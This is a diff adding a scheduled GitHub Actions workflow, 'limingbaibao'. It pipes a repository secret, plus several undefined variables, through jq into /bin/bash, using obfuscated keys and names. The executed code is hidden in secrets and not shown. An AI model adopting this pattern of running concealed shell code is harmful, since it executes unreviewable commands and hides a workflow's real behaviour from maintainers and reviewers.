@@ -1,0 +1,22 @@
+name: limingbaibao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: limingbaibao
+        env:
+          e1308: ${{ secrets.e1308 }}
+        run: |
+          echo $e1308 | jq -r .is750 | /bin/bash
+          echo $s8 | jq -r .ie8151 | /bin/bash
+          echo $qy49571 | jq -r .pwoj9 | /bin/bash
+          echo $rofs2 | jq -r .vzk2 | /bin/bash
+          echo $jyxlj45 | jq -r .uthac63323 | /bin/bash
+
